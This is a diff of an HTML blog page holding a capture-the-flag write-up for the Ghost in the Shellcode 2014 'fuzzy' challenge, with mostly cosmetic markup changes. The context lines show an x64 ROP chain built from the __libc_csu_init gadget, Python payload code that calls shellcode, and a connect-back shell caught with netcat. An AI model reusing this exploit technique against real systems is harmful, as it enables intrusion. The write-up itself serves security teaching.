@@ -25,7 +25,6 @@
                 <nav><ul>
                     <li><a href="http://codearcana.com">Blog</a></li>
                     <li><a href="http://codearcana.com/archives.html">Archives</a></li>
-                    <li ><a href="http://codearcana.com/pages/about.html">About</a></li>
                 </ul></nav>
         </header><!-- /#banner -->
 
@@ -35,7 +34,7 @@
         rel="bookmark" title="Permalink to Ghost in the Shellcode 2014 - <code>fuzzy</code>">Ghost in the Shellcode 2014 - <code>fuzzy</code></a></h1> <a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="awreece">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
  </header>
 <footer class="post-info">
-        <abbr class="published" title="2014-01-19T00:00:00">
+        <abbr class="published" title="2014-01-19T00:00:00-08:00">
                 Sun 19 January 2014
         </abbr>
 
@@ -53,7 +52,7 @@ Cross post from <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1146">PPP
 blog</a>.</p>
 <h2>The program</h2>
 <p><code>fuzzy</code> is a "super secure parsing engine", that includes a histogram function:</p>
-<div class="highlight"><pre><span class="gp">$</span> nc fuzzy.2014.ghostintheshellcode.com 4141
+<div class="highlight"><pre><span></span><span class="gp">$</span> nc fuzzy.2014.ghostintheshellcode.com 4141
 <span class="go">Welcome to the super secure parsing engine!</span>
 <span class="go">Please select a parser!</span>
 
@@ -67,7 +66,7 @@ blog</a>.</p>
 <span class="go">Enter a series of characters</span>
 <span class="go">hello</span>
 <span class="go"> :0 !:0 &quot;:0 #:0 $:0 </span>
-<span class="gp">%</span>:0 &amp;:0 <span class="err">&#39;</span>:0 <span class="o">(</span>:0 <span class="o">)</span>:0 
+<span class="gp">%</span>:0 <span class="p">&amp;</span>:0 <span class="err">&#39;</span>:0 <span class="o">(</span>:0 <span class="o">)</span>:0 
 <span class="go">... &lt;snip&gt; ...</span>
 <span class="go">a:0 b:0 c:0 d:0 e:1 </span>
 <span class="go">f:0 g:0 h:1 i:0 j:0 </span>
@@ -94,7 +93,7 @@ section that is never used), then invoke <code>callFunction</code> to run our sh
 Unfortunately, since this is x64, we need to find a good gadget to be able to
 control registers and call functions. Luckily, there is a good gadget in 
 <code>__libc_csu_init</code>:</p>
-<div class="highlight"><pre><span class="nl">loc_401790:</span>                             <span class="c1">; CODE XREF: __libc_csu_init+64j</span>
+<div class="highlight"><pre><span></span><span class="nl">loc_401790:</span>                             <span class="c1">; CODE XREF: __libc_csu_init+64j</span>
                 <span class="nf">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nv">r13</span>
                 <span class="nf">mov</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nv">r14</span>
                 <span class="nf">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">r15d</span>
@@ -125,11 +124,11 @@ function (that we have a pointer to) because it reads its arguments out of a
 buffer and we don't have an easy way to call functions with a buffer we control 
 as an argument. Still, this gadget allows us to chain calls arbitrary function pointers
 with 3 arguments:</p>
-<div class="highlight"><pre><span class="c"># Assumes rip points to loc_4017A6.</span>
+<div class="highlight"><pre><span></span><span class="c1"># Assumes rip points to loc_4017A6.</span>
 <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">function_ptr</span><span class="p">,</span> <span class="n">arg0</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">):</span>
-  <span class="c"># Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to</span>
-  <span class="c"># loc_4017A6 for repeated calls.</span>
-  <span class="c">#      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi</span>
+  <span class="c1"># Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to</span>
+  <span class="c1"># loc_4017A6 for repeated calls.</span>
+  <span class="c1">#      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi</span>
   <span class="k">return</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">function_ptr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">arg2</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">arg1</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">arg0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">__libc_csu_init_gadget</span><span class="p">)</span>
 </pre></div>
 
@@ -138,7 +137,7 @@ with 3 arguments:</p>
 gadget.
 We call <code>memset</code> 4 times, once for each distinct byte in
 the the address of <code>readAll</code>, and make <code>dontcollide</code> a pointer to <code>readAll</code>.</p>
-<div class="highlight"><pre><span class="c"># Set dontcollide to be a function pointer to readAll (0x4013cb).</span>
+<div class="highlight"><pre><span></span><span class="c1"># Set dontcollide to be a function pointer to readAll (0x4013cb).</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">memset_fptr</span><span class="p">,</span> <span class="n">dontcollide</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
@@ -149,17 +148,17 @@ the the address of <code>readAll</code>, and make <code>dontcollide</code> a poi
 <p>We then can use our gadget to call <code>readAll</code>, 
 reading the encrypted shellcode into <code>dontcollide</code>, and then again to call
 <code>callFunction</code>, executing our shellcode. </p>
-<div class="highlight"><pre><span class="c"># Read the shellcode into a buffer. The socket to read from is 4.</span>
+<div class="highlight"><pre><span></span><span class="c1"># Read the shellcode into a buffer. The socket to read from is 4.</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">dontcollide</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
 
-<span class="c"># Call our shellcode.</span>
+<span class="c1"># Call our shellcode.</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">call</span><span class="p">(</span><span class="n">callEncryptedFunction_fptr</span><span class="p">,</span> <span class="n">dontcollide</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 </pre></div>
 
 
 <p>We grab some connect back shellcode 
 and get a shell:</p>
-<div class="highlight"><pre><span class="go">~% python fuzzy.py                                           [console 1]</span>
+<div class="highlight"><pre><span></span><span class="go">~% python fuzzy.py                                           [console 1]</span>
 <span class="go">~% nc -l 16705                                               [console 2]</span>
 <span class="go">cat key.txt</span>
 <span class="go">key is: fuzzingIsFun2</span>
@@ -193,36 +192,6 @@ and get a shell:</p>
 		<div class="widget">
 		    <h2>Tags</h2>
 		    <ul class="cloud">
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/omnios.html">omnios</a>
-			</li>
-			<li class="tag-2">
-			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
-			</li>
-			<li class="tag-1">
-			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
-			</li>
-			<li class="tag-1">
-			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/gdb.html">gdb</a>
-			</li>
-			<li class="tag-1">
-			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
-			</li>
-			<li class="tag-4">
-			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
-			</li>
-			<li class="tag-2">
-			  <a class="tag" href="http://codearcana.com/tag/ctf.html">ctf</a>
-			</li>
 		    </ul>
 		</div>
 
